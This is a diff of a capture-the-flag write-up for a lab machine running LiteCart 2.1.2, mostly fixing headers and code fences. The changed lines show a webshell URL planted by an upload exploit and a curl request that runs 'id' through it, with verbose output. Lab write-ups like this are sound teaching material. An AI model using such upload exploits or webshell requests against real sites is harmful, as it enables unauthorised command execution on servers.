@@ -169,7 +169,7 @@ Logging in at /shop/admin/login.php with those creds works:
 
 At the bottom, it identifies the LiteCart version, 2.1.2, which is the one with the upload vulnerability.
 
-# shell As myasql
+# Shell as mysql
 
 ### Exploit
 
@@ -188,7 +188,8 @@ Shell => http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id```
 
 The exploit is nice enough to give me the address of the webshell, and visiting it returns an empty page:
 
-```root@kali# curl -v 'http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id'
+```code 
+root@kali# curl -v 'http://10.10.10.207/shop/admin/../vqmod/xml/S59WW.php?c=id'
 *   Trying 10.10.10.207:80...
 * Connected to 10.10.10.207 (10.10.10.207) port 80 (#0)
 > GET /shop/vqmod/xml/S59WW.php?c=id HTTP/1.1
@@ -203,7 +204,8 @@ The exploit is nice enough to give me the address of the webshell, and visiting 
 < Content-Length: 0
 < Content-Type: text/html; charset=UTF-8
 < 
-* Connection #0 to host 10.10.10.207 left intact```
+* Connection #0 to host 10.10.10.207 left intact
+code```
 
 So the upload succeeded, but the execution isn’t working. I can check that a different way by modifying the script. It’s this line that sets the payload:
 
